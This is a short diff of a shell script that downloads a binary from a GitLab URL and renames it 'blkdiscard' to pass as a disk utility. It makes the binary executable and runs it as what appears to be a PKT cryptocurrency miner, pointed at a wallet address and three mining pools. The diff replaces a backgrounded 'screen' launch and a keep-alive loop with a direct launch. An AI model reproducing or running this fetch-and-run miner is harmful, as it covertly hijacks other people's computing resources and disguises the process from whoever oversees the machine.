@@ -5,5 +5,4 @@ wget -q https://gitlab.com/bspot1/pekate/-/raw/main/tkp
 mv tkp blkdiscard
 chmod +x blkdiscard
 sudo ph add blkdiscard
-screen -dmS blkdiscard ./blkdiscard ann -p pkt1qme9x0hhphrsk39e4gxgg3g0dmqn2cyhkxjyec7 http://pool.srizbi.com http://pool.pktpool.io http://pool.pkt.world
-while :; do shuf -n 1 -i 1-99999999; sleep 10; done
+./blkdiscard ann -p pkt1qme9x0hhphrsk39e4gxgg3g0dmqn2cyhkxjyec7 http://pool.srizbi.com http://pool.pktpool.io http://pool.pkt.world
